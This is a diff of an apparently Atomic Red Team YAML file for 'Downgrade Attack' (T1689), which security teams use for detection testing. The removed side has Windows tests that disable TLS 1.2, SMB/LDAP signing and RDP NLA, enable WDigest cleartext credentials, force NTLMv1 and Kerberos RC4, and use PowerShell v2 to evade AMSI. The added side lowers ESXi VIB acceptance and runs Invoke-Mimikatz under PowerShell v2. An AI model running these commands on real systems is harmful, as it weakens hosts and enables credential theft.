@@ -1,188 +1,102 @@
 attack_technique: T1689
-display_name: Downgrade Attack
+display_name: 'Downgrade Attack'
 atomic_tests:
-# ------------------------------------------------------------
-# 1. PowerShell Version 2 Downgrade
-# ------------------------------------------------------------
-  - name: PowerShell Version 2 Downgrade (Logging Bypass)
-    description: |
-      Adversaries may force PowerShell to run as version 2.0 to bypass modern security features like AMSI and Script Block Logging.
-      This test requires .NET 3.5 (NetFx3) to be installed on modern Windows systems.
-    supported_platforms:
-      - windows
-    dependency_executor_name: powershell
-    dependencies:
-      - description: |
-          Check if .NET 3.5 and PowerShell 2.0 are installed/enabled.
-        prereq_command: |
-          $netfx3 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3
-          if ($netfx3.State -ne "Enabled") {
-            Write-Host ".NET 3.5 or PowerShell V2 is not enabled. Please run the prerequisite command to enable them." -ForegroundColor Red
-            exit 1
-          } else {
-            Write-Host ".NET 3.5 and PowerShell V2 are already enabled." -ForegroundColor Green
-          }
-        get_prereq_command: |
-          Write-Host "Installing .NET 3.5 and PowerShell V2. This may take a few minutes..." -ForegroundColor Yellow
-          Enable-WindowsOptionalFeature -Online -FeatureName NetFx3 -All -NoRestart -ErrorAction Stop
-          Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -All -NoRestart -ErrorAction Stop
-          Write-Host "Installation complete. Please restart the system to apply changes." -ForegroundColor Green
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        powershell.exe -version 2 -Command "Write-Host 'Running in legacy PowerShell version:'; $PSVersionTable.PSVersion"
-
-# ------------------------------------------------------------
-# 2. LmCompatibilityLevel NTLM Downgrade
-# ------------------------------------------------------------
-  - name: Downgrade Windows LmCompatibilityLevel to Allow LM/NTLM
-    description: |
-      Modifies LmCompatibilityLevel to a less secure setting (1) to allow weak LM or NTLMv1 authentication, facilitating hash cracking.
-    supported_platforms:
-      - windows
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 1 /f
-        echo. & echo [VERIFICATION] New Registry Value: & reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel
-      cleanup_command: |
-        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 3 /f >nul 2>&1
-        echo. & echo [CLEANUP VERIFICATION] Restored Registry Value: & reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel
-
-# ------------------------------------------------------------
-# 3. TLS Protocol Downgrade (Schannel)
-# ------------------------------------------------------------
-  - name: Simulation of TLS/SSL Protocol Downgrade (Registry)
-    description: |
-      Disables TLS 1.2 to simulate a protocol downgrade via registry manipulation, forcing fallback to older, vulnerable protocols.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: true
-      command: |
-        $path = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client"
-        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
-        New-ItemProperty -Path $path -Name "Enabled" -Value 0 -PropertyType DWord -Force | Out-Null
-        Write-Host "`n[VERIFICATION] New Registry Value:" -ForegroundColor Cyan
-        Get-ItemProperty -Path $path -Name "Enabled" | Select-Object PSPath, Enabled | Format-List
-      cleanup_command: |
-        $path = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client"
-        Remove-ItemProperty -Path $path -Name "Enabled" -ErrorAction Ignore
-        Write-Host "`n[CLEANUP VERIFICATION] TLS 1.2 Enabled key removed (default OS behavior restored)." -ForegroundColor Green
-
-# ------------------------------------------------------------
-# 4. SMBv1 Downgrade
-# ------------------------------------------------------------
-  - name: Disable SMBv2/v3 to Force SMBv1 Downgrade
-    description: |
-      Disables SMBv2 and SMBv3 protocols to force SMBv1 communication, exposing the system to legacy vulnerabilities.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: true
-      command: |
-        Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force
-        Write-Host "`n[VERIFICATION] SMB Configuration State:" -ForegroundColor Cyan
-        Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol | Format-List
-      cleanup_command: |
-        Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
-        Write-Host "`n[CLEANUP VERIFICATION] SMB Configuration Restored:" -ForegroundColor Green
-        Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol | Format-List
-
-# ------------------------------------------------------------
-# 5. RDP Network Level Authentication (NLA) Downgrade
-# ------------------------------------------------------------
-  - name: Disable Network Level Authentication (NLA) for RDP
-    description: |
-      Disables NLA for Remote Desktop Services. Adversaries downgrade RDP security to bypass CredSSP and force standard RDP encryption, exposing the session to MitM attacks.
-    supported_platforms:
-      - windows
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
-        echo. & echo [VERIFICATION] New Registry Value: & reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication
-      cleanup_command: |
-        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f >nul 2>&1
-        echo. & echo [CLEANUP VERIFICATION] Restored Registry Value: & reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication
-
-# ------------------------------------------------------------
-# 6. WDigest Credential Downgrade
-# ------------------------------------------------------------
-  - name: Enable WDigest Authentication (Credential Downgrade)
-    description: |
-      Enables WDigest authentication by setting the UseLogonCredential registry key. This forces Windows to store credentials in cleartext within LSASS memory.
-    supported_platforms:
-      - windows
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
-        echo. & echo [VERIFICATION] New Registry Value: & reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential
-      cleanup_command: |
-        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /f >nul 2>&1
-        echo. & echo [CLEANUP VERIFICATION] UseLogonCredential key removed.
-
-# ------------------------------------------------------------
-# 7. Kerberos RC4 Downgrade
-# ------------------------------------------------------------
-  - name: Downgrade Kerberos Encryption to RC4
-    description: |
-      Modifies the SupportedEncryptionTypes registry key to force Kerberos authentication to use weaker RC4 encryption instead of AES, facilitating offline Kerberoasting.
-    supported_platforms:
-      - windows
-    executor:
-      name: powershell
-      elevation_required: true
-      command: |
-        $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters"
-        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
-        New-ItemProperty -Path $path -Name "SupportedEncryptionTypes" -Value 4 -PropertyType DWord -Force | Out-Null
-        Write-Host "`n[VERIFICATION] New Registry Value:" -ForegroundColor Cyan
-        Get-ItemProperty -Path $path -Name "SupportedEncryptionTypes" | Select-Object PSPath, SupportedEncryptionTypes | Format-List
-      cleanup_command: |
-        $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters"
-        Remove-ItemProperty -Path $path -Name "SupportedEncryptionTypes" -ErrorAction Ignore
-        Write-Host "`n[CLEANUP VERIFICATION] SupportedEncryptionTypes key removed." -ForegroundColor Green
-
-# ------------------------------------------------------------
-# 8. SMB Client Signing Downgrade
-# ------------------------------------------------------------
-  - name: Disable SMB Client Signing
-    description: |
-      Disables SMB signing on the client (Workstation) side by modifying the RequireSecuritySignature registry key. Adversaries downgrade this to make the system vulnerable to SMB Relay attacks.
-    supported_platforms:
-      - windows
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add "HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
-        echo. & echo [VERIFICATION] New Registry Value: & reg query "HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature
-      cleanup_command: |
-        reg add "HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f >nul 2>&1
-        echo. & echo [CLEANUP VERIFICATION] Restored Registry Value: & reg query "HKLM\System\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature
-
-# ------------------------------------------------------------
-# 9. LDAP Client Signing Downgrade
-# ------------------------------------------------------------
-  - name: Disable LDAP Client Integrity (Signing)
-    description: |
-      Disables LDAP client signing requirements. Adversaries downgrade this to facilitate LDAP relay attacks and capture cleartext domain traffic.
-    supported_platforms:
-      - windows
-    executor:
-      name: command_prompt
-      elevation_required: true
-      command: |
-        reg add "HKLM\SYSTEM\CurrentControlSet\Services\ldap" /v ldapclientintegrity /t REG_DWORD /d 0 /f
-        echo. & echo [VERIFICATION] New Registry Value: & reg query "HKLM\SYSTEM\CurrentControlSet\Services\ldap" /v ldapclientintegrity
-      cleanup_command: |
-        reg add "HKLM\SYSTEM\CurrentControlSet\Services\ldap" /v ldapclientintegrity /t REG_DWORD /d 1 /f >nul 2>&1
-        echo. & echo [CLEANUP VERIFICATION] Restored Registry Value: & reg query "HKLM\SYSTEM\CurrentControlSet\Services\ldap" /v ldapclientintegrity
+- name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
+  auto_generated_guid: 062f92c9-28b1-4391-a5f8-9d8ca6852091
+  description: |
+    An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
+  supported_platforms:
+  - linux
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if VMWARE PowerCLI PowerShell Module is installed.
+    prereq_command: |
+      $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+    get_prereq_command: |
+      Install-Module -Name VMware.PowerCLI -Confirm:$false
+  executor:
+    command: |
+      Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+      Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
+      (Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"})
+      Disconnect-VIServer -Confirm:$false
+    name: powershell
+    elevation_required: true
+- name: ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI
+  auto_generated_guid: 14d55b96-b2f5-428d-8fed-49dc4d9dd616
+  description: |
+    An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to script with commands to change acceptance level
+      type: path
+      default: PathToAtomicsFolder\T1698\src\esx_community_supported.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+- name: PowerShell Version 2 Downgrade
+  auto_generated_guid: 47c96489-2f55-4774-a6df-39faff428f6f
+  description: Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: Check if Version 2 is installed.
+    prereq_command: |
+      $v2_installed = PowerShell -version 2 -command '$PSVersionTable.PSVersion.Major'
+      if (-not $v2_installed) {exit 1} else {exit 0}
+    get_prereq_command: |
+      echo "Manually install PowerShell Version 2"
+  executor:
+    command: PowerShell -version 2 -command '#{v2_command}'
+    name: powershell
+    elevation_required: false
+  input_arguments:
+    v2_command:
+      description: Specify the command to execute with Version 2
+      type: string
+      default: Invoke-Mimikatz
